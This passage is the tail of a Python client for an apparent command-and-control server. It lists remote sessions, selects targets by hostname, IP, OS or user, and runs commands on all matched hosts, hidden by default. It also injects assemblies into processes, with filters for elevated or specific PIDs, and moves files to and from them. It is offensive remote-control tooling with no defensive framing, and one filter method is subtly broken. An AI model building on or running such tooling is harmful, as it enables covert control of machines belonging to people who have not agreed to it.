        if not isinstance(e, list) or len(e) == 0:
            return
        print(
            f'{"Host":9}{"ID":6}{"Type":5}{"Status":11}{"Start":10}{"Complete":10}{"Result"}\n{"="*60}'
        )
        for s in e:
            self._print_jobs(s["id"], True)

    def do_assembly(self, session, source, detach, wait, timeout, filter):
        j = self._task_assembly(session, _expand(source), detach, _filter(filter))
        if not wait:
            return
        self._spin(session, j, timeout, f'assembly from "{source}"', None)
        del j

    def do_execute(self, session, cmd, hide, detach, wait, timeout, filter):
        j = self._task_execute(session, cmd, hide, detach, _filter(filter))
        if not wait:
            return
        self._spin(session, j, timeout, cmd, None)
        del j

    def all_do_execute(self, cmd, hide, detach, wait, timeout, filter, matcher, hw):
        e = self._sessions(matcher=matcher, hw=hw)
        s = Spinner(self)
        s.start()
        f = _filter(filter)
        for x in e:
            j = self._task_execute(x["id"], cmd, hide, detach, f)
            if not wait:
                continue
            s.input.put(Action(j, x["id"], timeout, cmd=cmd), block=False)
            del j
        del e
        del f
        try:
            while not s.input.empty():
                sleep(1)
            # Using "cancel_futures" as a named arg fucks with PyRight.
            s.ex.shutdown(wait=True, **{"cancel_futures": False})
        except KeyboardInterrupt:
            pass
        s.close()
        del s


class Result(dict):
    def __init__(self, data=None, err=None):
        dict.__init__(self)
        self._error = err
        if isinstance(data, dict) and len(data) > 0:
            self.update(data)

    def pid(self):
        return self.get("pid", 0)

    def error(self):
        return self._error

    def handle(self):
        return self.get("handle", 0)

    def is_error(self):
        return isinstance(self._error, str) and len(self._error) > 0

    def exit_code(self):
        return self.get("exit", 0)

    def type(self, opt=None):
        return self.get("type", opt)

    def data(self, raw=False):
        d = self.get("data")
        if not d:
            return None
        if raw:
            return b64decode(d)
        return b64decode(d).decode("UTF-8")


class Action(object):
    def __init__(self, job, session, timeout, out=None, cmd=None):
        self.job = job
        self.out = out
        self.cmd = cmd
        self.timeout = timeout
        self.session = session


class Filter(object):
    def __init__(self):
        self.pid = None
        self.session = None
        self.fallback = None
        self.evelated = None
        self.exclude = list()
        self.include = list()

    def json(self):
        r = dict()
        if isinstance(self.session, bool):
            r["session"] = self.session
        if isinstance(self.evelated, bool):
            r["elevated"] = self.evelated
        if isinstance(self.fallback, bool):
            r["fallback"] = self.fallback
        if isinstance(self.pid, int) and self.pid > 0:
            r["pid"] = self.pid
        if isinstance(self.exclude, list) and len(self.exclude) > 0:
            r["exclude"] = self.include
        if isinstance(self.include, list) and len(self.include) > 0:
            r["include"] = self.include
        return r


class Spinner(Thread):
    def __init__(self, rpc):
        Thread.__init__(self)
        self.rpc = rpc
        self.done = Event()
        self.active = list()
        self.alive = Event()
        self.input = Queue()
        self.sh = scheduler(timefunc=time, delayfunc=sleep)
        self.ex = ThreadPoolExecutor(thread_name_prefix="Spinner", max_workers=32)

    def run(self):
        while not self.alive.is_set():
            try:
                j = self.input.get(block=True, timeout=1)
            except Empty:
                continue
            if j is None:
                continue
            if not isinstance(j, Action) or not _nes(j.session):
                continue
            if not isinstance(j.job, int) or j.job <= 0:
                continue
            if not isinstance(j.timeout, int) or j.timeout <= 0:
                j.timeout = 300
            e = Event()
            h = self.sh.enter(j.timeout, 1, e.set)
            self.ex.submit(self._spin, e, j, h)
            self.active.append(e)
            del j
        for i in self.active:
            i.set()
        self.ex.shutdown(True)
        self.done.set()

    def close(self):
        self.alive.set()
        self.ex.shutdown(False)
        self.done.wait()

    def _spin(self, event, j, handle):
        try:
            while not event.is_set():
                if self.rpc._process(j.session, j.job, j.out, j.cmd):
                    break
                sleep(1)
                self.sh.run(False)
        except Exception as err:
            print(f"[!] Exception during Queue runtime: {err}!", file=stderr)
        try:
            self.sh.cancel(handle)
            self.active.remove(event)
        except ValueError:
            pass
        event.set()


class Matcher(object):
    def __init__(self, host, ip, os, user):
        self.ip = Matcher._dry_compile(ip)
        self.os = Matcher._dry_compile(os)
        self.user = Matcher._dry_compile(user)
        self.host = Matcher._dry_compile(host)

    @staticmethod
    def _match(m, v):
        if not _nes(v):
            return False
        if isinstance(m, Pattern):
            return m.match(v) is not None
        if _nes(m) and m in v:
            return True
        return False

    @staticmethod
    def _dry_compile(v):
        if not _nes(v):
            return None
        try:
            return compile(v)
        except ValueError:
            pass
        return v

    def matches(self, e):
        if (
            self.ip is None
            and self.os is None
            and self.user is None
            and self.host is None
        ):
            return e
        if not isinstance(e, list) or len(e) == 0:
            return e
        n = list()
        for i in e:
            if "device" not in i:
                continue
            if self.ip is not None and Matcher._match(self.ip, _get_ip(i)):
                n.append(i)
                continue
            if self.os is not None and Matcher._match(self.os, i["device"].get("os")):
                n.append(i)
                continue
            if self.user is not None and Matcher._match(
                self.user, i["device"].get("user")
            ):
                n.append(i)
                continue
            if self.host is not None and Matcher._match(
                self.host, i["device"].get("hostname")
            ):
                n.append(i)
                continue
        return n


class RPCError(Exception):
    pass


class Parser(ArgumentParser):
    def __init__(self):
        ArgumentParser.__init__(self)
        self.add_argument(
            "-s",
            "--rpc",
            type=str,
            dest="rpc",
            default=None,
            required=False,
        )
        self.add_argument(
            "-k",
            "--key",
            type=str,
            dest="key",
            default=None,
            required=False,
        )
        self.add_argument(
            "--insecure",
            dest="insecure",
            action="store_true",
        )
        # Enumeration
        self.add_argument(
            "-l",
            "--list",
            dest="list",
            action="store_true",
        )
        self.add_argument(
            "-L",
            "--list-all",
            dest="list_all",
            action="store_true",
        )
        self.add_argument(
            "-x",
            "--listeners",
            dest="listeners",
            action="store_true",
        )
        self.add_argument(
            "-E",
            "--exp",
            type=str,
            dest="match_host",
            default=None,
            required=False,
        )
        self.add_argument(
            "-I",
            "--exp-ip",
            type=str,
            dest="match_ip",
            default=None,
            required=False,
        )
        self.add_argument(
            "-O",
            "--exp-os",
            type=str,
            dest="match_os",
            default=None,
            required=False,
        )
        self.add_argument(
            "-U",
            "--exp-user",
            type=str,
            dest="match_user",
            default=None,
            required=False,
        )
        self.add_argument(
            "-H",
            "--hardware",
            dest="hardware",
            action="store_true",
        )
        # Session Management
        self.add_argument(
            "-j",
            "--job",
            type=int,
            dest="job",
            default=None,
            required=False,
        )
        self.add_argument(
            "-q",
            "--info",
            dest="info",
            action="store_true",
        )
        self.add_argument(
            "-Q",
            "--info-all",
            dest="info_all",
            action="store_true",
        )
        self.add_argument(
            "-b",
            "--queue",
            dest="jobs",
            action="store_true",
        )
        self.add_argument(
            "-p",
            "--delete",
            dest="delete",
            action="store_true",
        )
        self.add_argument(
            "-P",
            "--shutdown",
            dest="shutdown",
            action="store_true",
        )
        # Execution
        self.add_argument(
            "-c",
            "--cmd",
            type=str,
            dest="cmd",
            default=None,
            required=False,
        )
        self.add_argument(
            "-i",
            "--interact",
            dest="interact",
            action="store_true",
        )
        self.add_argument(
            "--asm",
            type=str,
            dest="asm",
            default=None,
            required=False,
        )
        self.add_argument(
            "--pull",
            type=str,
            dest="pull",
            default=None,
            required=False,
        )
        # Execution Modifiers
        self.add_argument(
            "-t",
            "--timeout",
            type=int,
            dest="timeout",
            default=300,
        )
        self.add_argument(
            "-T",
            "--filter",
            type=str,
            dest="filter",
            default=None,
            required=False,
        )
        self.add_argument(
            "-r",
            "--no-wait",
            dest="wait",
            action="store_false",
        )
        self.add_argument(
            "-m",
            "--detach",
            dest="detach",
            action="store_true",
        )
        self.add_argument(
            "-z",
            "--no-hide",
            dest="hide",
            action="store_false",
        )
        self.add_argument(
            "-a",
            "--all",
            dest="all",
            action="store_true",
        )
        # File Operations
        self.add_argument(
            "-u",
            "--upload",
            type=str,
            dest="upload",
            default=None,
        )
        self.add_argument(
            "-d",
            "--download",
            type=str,
            dest="download",
            default=None,
        )
        self.add_argument(
            "-f",
            "--file",
            type=str,
            dest="file",
            default=None,
        )
        self.add_argument(
            type=str,
            dest="id",
            nargs="?",
            default=None,
        )

    def parse(self):
        a = self.parse_args()
        if not _nes(a.rpc):
            a.rpc = getenv("THUNDERSTORM_RPC")
            if not _nes(a.rpc):
                raise ValueError("[!] RPC Server URL must be specified!")
        if not _nes(a.key):
            a.key = getenv("THUNDERSTORM_KEY")
        if _is_bool_true(getenv("THUNDERSTORM_HW")):
            a.hardware = True
        r = RPC(a.rpc, a.key, a.insecure)
        return r.main(a)

    def print_help(self, file=stderr):
        print(HELP.format(exe=argv[0]), file=file)


if __name__ == "__main__":
    p = Parser()
    try:
        p.parse()
    except RuntimeError:
        p.print_help()
        exit(2)
    except Exception as err:
        print(
            f"[!] {err.__class__.__name__}: {err}\n{format_exc(limit=5)}", file=stderr
        )
        exit(1)
    exit(0)
